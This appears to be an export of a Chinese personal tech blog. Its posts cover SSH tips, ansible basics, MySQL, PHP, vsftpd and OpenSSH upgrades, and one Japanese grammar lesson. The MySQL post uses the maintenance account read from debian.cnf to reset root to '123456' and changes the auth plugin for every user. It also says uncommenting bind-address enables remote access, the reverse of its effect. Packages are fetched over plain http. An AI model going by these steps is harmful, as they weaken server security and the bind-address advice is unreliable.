服务器。为了解决这种情况，我们可以使用 -b 选项来指定一个IP 地址。这个 IP 将会被使用做建立连接的源地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] ➤ ssh -b 192.168.0.105 pi@192.168.0.116</span><br><span class="line">Linux raspberrypi 4.14.71-v7+ <span class="comment">#1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7l</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Feb 24 08:52:29 2019 from 192.168.0.105</span><br></pre></td></tr></table></figure><h3 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h3><p>如果我们想在目标主机执行一条命令，我们通常的做法是，先登录到目标主机，执行命令，再退出来。这样做当然是可以，但是比较麻烦。</p><p>如果我们仅仅是想远程执行一条命令，可以直接在后面跟上命令就好，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] ➤ ssh pi@192.168.0.116 ls -l</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">MagPi</span><br><span class="line">Music</span><br></pre></td></tr></table></figure><h3 id="挂载远程文件系统"><a href="#挂载远程文件系统" class="headerlink" title="挂载远程文件系统"></a>挂载远程文件系统</h3><p>另外一个很赞的基于 SSH 的工具叫 sshfs。 sshfs 可以让你在本地直接挂载远程主机的文件系统。它的使用格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshfs -o idmap=user user@hostname:/home/user ~/Remote</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshfs -o idmap=user pi@192.168.0.116:/home/pi ~/Pi</span><br></pre></td></tr></table></figure><p>这个命令可以将远程主机 pi 用户的主目录挂载到本地主目录下的 Pi 文件夹。</p><h4 id="类似文章"><a href="#类似文章" class="headerlink" title="类似文章"></a>类似文章</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&mid=2247485113&idx=1&sn=abea3f5747ab3de98304af6cb3cbc284&chksm=fd1c7e3fca6bf729240929b5e601689224cfa45af3d85687d526a933b9230c49ac4e71219fee&mpshare=1&scene=1&srcid=&key=b2c45c44f63c475036caf81458c44270265fe62073129d3613733350f1782404341d5c22f720910d41ea6434cd634cf4ace07220484616551b1cbda27b5a4c50fe20f488447cfec1c7922f7ad81b7fa4&ascene=1&uin=MjMxMTMxNDIxMw==&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=Ks6ARNaAyjOn+MDn0BlfGaZi3QgnAKBugECR9dT+pk7bVXvF/R+0jnIDyFwuIf9P">良许Linux 排除Linux机器是否被入侵</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 ansible (一)</title>
      <link href="2019/07/06/%E5%88%9D%E8%AF%86-ansible-1/"/>
      <url>2019/07/06/%E5%88%9D%E8%AF%86-ansible-1/</url>
      
        <content type="html"><![CDATA[<h3 id="个人踩滴小坑"><a href="#个人踩滴小坑" class="headerlink" title="个人踩滴小坑"></a>个人踩滴小坑</h3><p>要注意下下, 一些参数的含义是什么, 好比我调用 script 模块, 想把脚本调用到目标服务器去执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: backup base system version</span><br><span class="line">    script: /baseVersionBackup.sh 传入脚本参数1, 2, 3....</span><br></pre></td></tr></table></figure><p>“机智” 的我以为这是到对方服务器的根目录执行脚本….emmmmmm<br>** 注意 chdir 是脚本在对方服务器执行的目录, baseVersionBackup.sh 是你本机脚本的位置 **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确操作</span></span><br><span class="line">- name: backup base system version</span><br><span class="line">    script: <span class="built_in">chdir</span>=/ baseVersionBackup.sh 传入脚本参数1, 2, 3....</span><br></pre></td></tr></table></figure><h3 id="ansible-基于key的验证是一基本要求"><a href="#ansible-基于key的验证是一基本要求" class="headerlink" title="ansible: 基于key的验证是一基本要求"></a>ansible: 基于key的验证是一基本要求</h3><h3 id="特性"><a href="#特性" class="headerlink" title="特性:"></a>特性:</h3><ul><li>模块化</li><li>有Paramiko, PyYAML, Jinja2(模块语言)三个关键模块</li><li>支持自定义模块</li><li>基于python实现</li><li>部署简单，基于python和ssh(默认已安装), agentless</li><li>安全, 基于OpenSSH</li><li>支持playbook编排任务</li><li>幂等性: 一个任务执行一遍和执行n遍, 不因重复执行带来意外情况</li><li>无需代理不依赖PKI(无需ssl)</li><li>可使用任何变成语言写模块</li><li>YAML格式，编排任务，支持丰富的数据结构</li><li>较强大的多层解决方案</li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul><li><p>/etc/ansible/ansible.cfg 主配置文件，配置ansible工作特性(一般保持默认)<br>  为什么我执行的ansible指令对方就能执行？(tmp执行完会删除)</p><ul><li>脚本的临时目录:<br>remote_tmp  = ~/.ansible/tmp<br>local_tmp   = ~/.ansible/tmp</li></ul><ul><li>forks 并发执行</li><li>poll_interval 多长时间去拉一次数据</li><li>sudo_user 默认用户</li><li>ask_sudo_pass 是否询问口令</li><li>ask_pass    是否支持口令</li><li>host_key_checking 是否检查对应服务器的host_key, 建议取消注释</li><li>log_path    日志建议打开</li></ul></li><li><p>/etc/ansible/hosts 主机清单<br>  分组:<br>  [webserver]<br>  # 写域名需要借助dns去解析<br>  10.10.0.1[18:20]<br>  10.10.0.92:8080<br>  www[01:100].example.com<br>  db-[a:f].example.com</p></li><li><p>ssh基于key验证:<br>  ssh-keygen 输入完后加一下秘钥<br>  ssh-copy-id ip地址</p></li><li><p>Host-pattern:<br>  ALL、通配符*<br>  或关系，如: ansible “group1:group2” 或者 ansible “ip1:ip2”<br>  与关系，如: ansible “group1:&amp;group2” 两个组都在的主机<br>  非关系，如: ansible “group1:!group2” 在组1不在组2<br>  综合关系,如: ansible “group1:group2:&amp;group3:!group4”<br>  正则表达式 “~(web|file).*\.fosu\.com”<br>  /etc/ansible/roles/ 存放角色的目录</p></li></ul><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><ul><li>/usr/bin/ansible 主程序，临时命令执行工具<br>  –version<br>  -m 模块 默认command 例如ping<br>  -a 模块参数<br>  -v -vv -vvv<br>  –list-hosts 显示主机列表<br>  -k 提示输入ssh连接密码，默认Key验证<br>  -K 提示输入sudo时的口令<br>  -C 检查，并不执行<br>  -T TIMEOUT 默认10s<br>  -u 执行远程执行的用户<br>  -b sudo</li><li>/usr/bin/ansible-doc 查看配置文档，模块功能查看工具<br>  -a 可以列出当前模块列表，很多…<br>  -l 比较常用 ansible-doc -l ping<br>  -s 片段解释<br>  执行过程:<pre><code>  1.加载自己的配置文件 默认/etc/ansible/ansible.cfg  2.加载自己对应的模块文件,如command  3.通过ansible将模块或命令生成对应的临时py文件并将该文件传输至远程服务器的对应执行用户      $HOME/.ansible/tmp/ansible-tmp-数组/xxx.py文件  4.给文件+x执行  5.执行并返回结果  6.删除临时py文件, sleep 0退出</code></pre>  执行状态:<pre><code>  绿色:执行成功并且不需要做改变的操作  黄色:执行成功并且对目标主机做变更  红色:执行失败</code></pre></li><li>/usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台</li><li>/usr/bin/ansible-playbook 定制自动化任务，编排剧本工具/usr/bin/ansible-pull远程执行命令工具</li><li>/usr/bin/ansible-valut 文件加密工具</li><li>/usr/bin/ansible-console 基于Console界面与用户交互的执行工具</li></ul><h3 id="自动化运维应用场景"><a href="#自动化运维应用场景" class="headerlink" title="自动化运维应用场景"></a>自动化运维应用场景</h3><ul><li>文件传输</li><li>命令执行<br>  应用部署<br>  配置管理<br>  任务流编排</li><li>工具：<br>  Ansible 适合中小型企业<br>  Puppet 适合大型公司，例如谷歌</li></ul><h3 id="相关概念："><a href="#相关概念：" class="headerlink" title="相关概念："></a>相关概念：</h3><p>代码发布机(堡垒机)通常存在发布环境中：负责把在开发完成经测试没问题后发布到生产环境中<br>通常需要2台(主备)</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL upgrade, from 5.5.* to 5.7.*</title>
      <link href="2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/"/>
      <url>2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/</url>
      
        <content type="html"><![CDATA[<h3 id="服务器版本-Ubuntu14-04"><a href="#服务器版本-Ubuntu14-04" class="headerlink" title="服务器版本 Ubuntu14.04"></a>服务器版本 Ubuntu14.04</h3><h3 id="备份-快照"><a href="#备份-快照" class="headerlink" title="备份(快照)"></a>备份(快照)</h3><h3 id="日常忘记密码-知道密码滴请直接跳至-开始升级至5-7"><a href="#日常忘记密码-知道密码滴请直接跳至-开始升级至5-7" class="headerlink" title="日常忘记密码 -,- (知道密码滴请直接跳至 开始升级至5.7.* )"></a>日常忘记密码 -,- (知道密码滴请直接跳至 开始升级至5.7.* )</h3><p>介绍一个简单修改数据库密码的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/mysql/debian.cnf </span><br></pre></td></tr></table></figure><p>红线选中部分为我本地mysql的用户和密码(<strong>password部分每个人不同的喔!</strong>)<br><img src="/img/Linux_Server_Maintenance/mysqlForgetPass1.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/mysqlForgetPass1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="pass"><br>存在mysql的debian-sys-maint用户和密码,那他们是怎么来的呢?</p><p>先假科普一波, 正如它的字面意思（Debian System Matainence），Debian系统对MySQL维护用的，你可以理解为通过系统的某个 “非常规” 程序对Mysql进行备份恢复等行为时，该程序所使用的登录Mysql的账户。</p><p>使用以上账号密码登录至mysql执行下面三条命令就可以把密码更改为 123456啦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"></span><br><span class="line">update user <span class="built_in">set</span> authentication_string=password(<span class="string">&#x27;123456&#x27;</span>) <span class="built_in">where</span> user=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line">update user <span class="built_in">set</span> plugin=<span class="string">&#x27;mysql_native_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>登录验证下即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h3 id="开始升级至5-7"><a href="#开始升级至5-7" class="headerlink" title="开始升级至5.7.*"></a>开始升级至5.7.*</h3><p>默认情况下，apt是无法直接升级到mysql5.7的，因此需要额外设置</p><p>首先，备份数据，尽管下面的方式不会丢失你的数据，但是为了安全考虑，建议备份。</p><ul><li>下载mysql-apt的配置包，并安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql-apt-config_0.8.1-1_all.deb</span><br><span class="line"></span><br><span class="line">sudo dpkg -i mysql-apt-config_0.8.1-1_all.deb</span><br></pre></td></tr></table></figure><p>在安装的过程中，会要求选择mysql版本，选择mysql5.7版本后，点击“OK”。</p><ul><li>更新源并安装数据库，在安装过程中，会自动卸载已经安装的老版本数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure><ul><li>安装 mysql 后，使用mysql_upgrade升级数据库文件版本(必须是root用户喔!)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_upgrade -uroot -p</span><br></pre></td></tr></table></figure><ul><li>重启mysql,并检查数据是否正常</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql restart</span><br><span class="line"></span><br><span class="line">mysqlcheck -uroot -p --all-databases</span><br></pre></td></tr></table></figure><ul><li>如果一切正常，所有表的检查结果均是ok状态。</li></ul><p>同时，也可以进入mysql使用select version()； 来查看mysql-server 版本号。</p><h3 id="更新过程中遇到的问题："><a href="#更新过程中遇到的问题：" class="headerlink" title="更新过程中遇到的问题："></a>更新过程中遇到的问题：</h3><ul><li>在ubuntu 14的版本中，安装了mysql 后，启动时，程序提示 “No directory, logging in with HOME=/”。 具体如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@xxx:/etc/mysql<span class="comment"># service mysql restart</span></span><br><span class="line"> \* Stopping MySQL Community Server 5.7.11</span><br><span class="line">...</span><br><span class="line"> \* MySQL Community Server 5.7.11 is stopped</span><br><span class="line"> \* Re-starting MySQL Community Server 5.7.11</span><br><span class="line">No directory, logging <span class="keyword">in</span> with HOME=/</span><br><span class="line">..</span><br><span class="line"> \* MySQL Community Server 5.7.11 is started</span><br></pre></td></tr></table></figure><p>解决办法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service MySQL stop</span><br><span class="line">sudo usermod -d /var/lib/mysql/ mysql</span><br><span class="line">sudo service mysql start</span><br></pre></td></tr></table></figure><ul><li>更新mysql版本后，所有的配置文件都会被删除，因此需要修改mysql配置<br>说人话就是，远程是访问不到本数据库的</li></ul><p>把 /etc/mysql/mysql.conf.d/mysql.cnf 配置文件中<br>#bind-address =127.0.0.1 的注释符号去掉即可</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP upgrade, from 5.5.* to 7.2.*</title>
      <link href="2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/"/>
      <url>2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/</url>
      
        <content type="html"><![CDATA[<h3 id="服务器版本-CentOS6"><a href="#服务器版本-CentOS6" class="headerlink" title="服务器版本 CentOS6"></a>服务器版本 CentOS6</h3><h3 id="备份-快照"><a href="#备份-快照" class="headerlink" title="备份(快照)"></a>备份(快照)</h3><h3 id="首先卸载当前版本PHP"><a href="#首先卸载当前版本PHP" class="headerlink" title="首先卸载当前版本PHP"></a>首先卸载当前版本PHP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove php*</span><br></pre></td></tr></table></figure><h3 id="配置yum仓库"><a href="#配置yum仓库" class="headerlink" title="配置yum仓库"></a>配置yum仓库</h3><p>在CentOS6/7升级PHP至7.* 需要开启Remi和EPEL仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line"></span><br><span class="line">rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm</span><br></pre></td></tr></table></figure><h3 id="安装PHP7-2"><a href="#安装PHP7-2" class="headerlink" title="安装PHP7.2"></a>安装PHP7.2</h3><p>需要在yum中指定需要使用的相关仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php</span><br></pre></td></tr></table></figure><p>安装完成后检查 PHP 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br></pre></td></tr></table></figure><h3 id="安装相关-PHP-模块"><a href="#安装相关-PHP-模块" class="headerlink" title="安装相关 PHP 模块"></a>安装相关 PHP 模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php-xml php-soap php-xmlrpc php-mbstring php-json php-gd php-mcrypt php-fpm</span><br></pre></td></tr></table></figure><p>这里有个小坑,我在安装php-gd的时候会弹出一下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: Package: gd-last-2.2.5-5.el6.remi.x86_64 (remi-safe)</span><br><span class="line">           Requires: libwebp.so.5()(64bit)</span><br><span class="line"> You could try using --skip-broken to work around the problem</span><br></pre></td></tr></table></figure><p>谷歌libwebp.so.5()(64bit)这个依赖项后发现以下两个链接</p><p><a href="https://pkgs.org/download/libwebp.so.5()(64bit)">https://pkgs.org/download/libwebp.so.5()(64bit)</a><br><a href="https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html">https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html</a></p><p>于是顺势找到rpm包链接</p><p><a href="http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm">http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm</a></p><p>安装它就好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -i it</span><br></pre></td></tr></table></figure><p>接下来就可以启动php-fpm并设置为开机启动啦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service php-fpm start</span><br><span class="line"></span><br><span class="line">chkconfig php-fpm on</span><br></pre></td></tr></table></figure><p>如果需要,也把mysql服务装上,顺便启用它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php-mysql</span><br><span class="line"></span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「形容詞」</title>
      <link href="2019/07/02/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/"/>
      <url>2019/07/02/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="「な形容詞」"><a href="#「な形容詞」" class="headerlink" title="「な形容詞」"></a>「な形容詞」</h3><ul><li><strong>「な形容詞」+ な　+ 名词 ，因此称为「な形容詞」</strong><br>&nbsp; 名词 + の + 名词</li></ul><p>にぎやか：热闹的</p><h3 id="「い形容詞」特徴：〜い"><a href="#「い形容詞」特徴：〜い" class="headerlink" title="「い形容詞」特徴：〜い"></a>「い形容詞」特徴：〜い</h3><ul><li>い形容詞 + 名词<br>例：大きい会社</li></ul><table><thead><tr><th align="center">肯定行</th><th align="center">否定行</th></tr></thead><tbody><tr><td align="center">〜います</td><td align="center">〜 **<del>い</del>**くないです</td></tr><tr><td align="center">寒いです</td><td align="center">寒くないです</td></tr></tbody></table><p>辛い　暖かい　暑い　（食べ）たいです</p>]]></content>
      
      
      <categories>
          
          <category> 勉強 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勉強 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsftpd upgrade, from 2.2.2 to 3.0.3</title>
      <link href="2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/"/>
      <url>2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次vsftpd-升级过程"><a href="#记一次vsftpd-升级过程" class="headerlink" title="记一次vsftpd 升级过程"></a>记一次vsftpd 升级过程</h3><h3 id="备份-快照"><a href="#备份-快照" class="headerlink" title="备份(快照)"></a>备份(快照)</h3><h3 id="收集系统信息以及原有vsftpd安装版本信息"><a href="#收集系统信息以及原有vsftpd安装版本信息" class="headerlink" title="收集系统信息以及原有vsftpd安装版本信息"></a>收集系统信息以及原有vsftpd安装版本信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">rpm -qa | grep vsftpd</span><br><span class="line">vsftpd -v</span><br></pre></td></tr></table></figure><h3 id="卸载原-vsftpd"><a href="#卸载原-vsftpd" class="headerlink" title="卸载原 vsftpd"></a>卸载原 vsftpd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -e vsftpd-******</span><br></pre></td></tr></table></figure><h3 id="GPG签名认证"><a href="#GPG签名认证" class="headerlink" title="GPG签名认证"></a>GPG签名认证</h3><p>由于没用到公钥,因此跳过下面两条命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg -import publickey</span><br><span class="line">gpg -verify ***.asc(.sig) ***</span><br></pre></td></tr></table></figure><h3 id="解压后进行库文件相关设置"><a href="#解压后进行库文件相关设置" class="headerlink" title="解压后进行库文件相关设置"></a>解压后进行库文件相关设置</h3><p>安装之前,如果系统为64位，需要更改vsf_findlibs.sh文件库中lib 路径改为lib64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/lib\//lib64\//g&#x27;</span> vsf_findlibs.sh</span><br></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>由于没有相关依赖,因此不用进行预编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="配置信息修改"><a href="#配置信息修改" class="headerlink" title="配置信息修改"></a>配置信息修改</h3><p>因为是升级安装，需要保留原来vsftp的相关配置，接下来需要复制些文件到相应<br>vsftp目录。具体操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp vsftpd.conf /etc                   <span class="comment">#配置主文件     </span></span><br><span class="line">cp RedHat/vsftpd.pam /etc/pam.d/ftp   <span class="comment">#PAM 认证文件</span></span><br></pre></td></tr></table></figure><p>如果系统为64位，请将/etc/pam.d/ftp /lib目录替换为/lib64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/lib\//lib64\//g&#x27;</span> /etc/pam.d/ftp</span><br></pre></td></tr></table></figure><p>将以下内容写入 /etc/vsftpd.conf</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">anonymous_enable=NO</span><br><span class="line">local_enable=yes</span><br><span class="line">write_enable=YES</span><br></pre></td></tr></table></figure><h3 id="启动-vsftpd-进行测试"><a href="#启动-vsftpd-进行测试" class="headerlink" title="启动 vsftpd 进行测试"></a>启动 vsftpd 进行测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd /etc/vsftpd.conf &amp;</span><br></pre></td></tr></table></figure><h3 id="把-vsftpd-加入到开机启动项中"><a href="#把-vsftpd-加入到开机启动项中" class="headerlink" title="把 vsftpd 加入到开机启动项中"></a>把 vsftpd 加入到开机启动项中</h3><p>将以下内容写入 /etc/rc.d/rc.local_enable</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd /etc/vsftpd.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><h3 id="修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建"><a href="#修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建" class="headerlink" title="修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建"></a>修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建</h3><p>创建 /usr/share/empty 文件夹并将以下内容写入 /etc/vsftpd.conf</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_chroot_dir=/usr/share/<span class="built_in">empty</span></span><br></pre></td></tr></table></figure><p>注意：如重启后不能启动服务修改 /etc/xinetd.d/vsftpd 文件，把 disable=no 改成 disable=yes 就行了</p><h3 id="版本验证"><a href="#版本验证" class="headerlink" title="版本验证"></a>版本验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd -v</span><br></pre></td></tr></table></figure><h4 id="参考自-https-blog-csdn-net-dbdeep-article-details-63037691"><a href="#参考自-https-blog-csdn-net-dbdeep-article-details-63037691" class="headerlink" title="参考自: https://blog.csdn.net/dbdeep/article/details/63037691"></a>参考自: <a href="https://blog.csdn.net/dbdeep/article/details/63037691">https://blog.csdn.net/dbdeep/article/details/63037691</a></h4>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> vsftpd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> vsftpd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssh upgrade, from 7.5 to 8.0p1</title>
      <link href="2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/"/>
      <url>2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次OpenSSH升级过程"><a href="#记一次OpenSSH升级过程" class="headerlink" title="记一次OpenSSH升级过程"></a>记一次OpenSSH升级过程</h3><h3 id="系统环境-Ubuntu14-04"><a href="#系统环境-Ubuntu14-04" class="headerlink" title="系统环境: Ubuntu14.04"></a>系统环境: Ubuntu14.04</h3><h3 id="sshd-D"><a href="#sshd-D" class="headerlink" title="sshd -D"></a>sshd -D</h3><p>先是修改sshd配置允许root登录，但是重启不了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh restart </span><br></pre></td></tr></table></figure><p>查看得知存在 sshd -D 进程并终止它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep ssh</span><br><span class="line">sudo <span class="built_in">kill</span> ID</span><br></pre></td></tr></table></figure><p>最后开启sshd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><p>启动后就可以root登录了<br>emmm…. 好像启动后只能登录一次?<br>那请试试:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/sshd -t</span><br></pre></td></tr></table></figure><p>好奇的我想知道-D是什么意思…<br>但看了说明也不知道为什么系列。。<br>-D When this option is specified, sshd will not detach and does not become a daemon.  This allows easy monitoring of 